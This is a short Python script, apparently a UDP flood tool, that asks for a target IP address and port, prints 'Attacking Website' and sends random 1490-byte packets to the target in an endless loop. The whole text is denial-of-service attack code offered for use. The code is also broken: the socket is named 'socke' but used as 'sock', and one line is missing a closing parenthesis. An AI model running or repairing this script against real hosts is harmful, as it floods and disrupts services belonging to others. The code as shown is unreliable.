import socket
import random
socke = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
byte = random._urandom(1490)
ip = input('target ip: ')
port = int(input('put a port: ')
print('Attacking Website') 
while True:
     sock.sendto(byte, (ip,port))
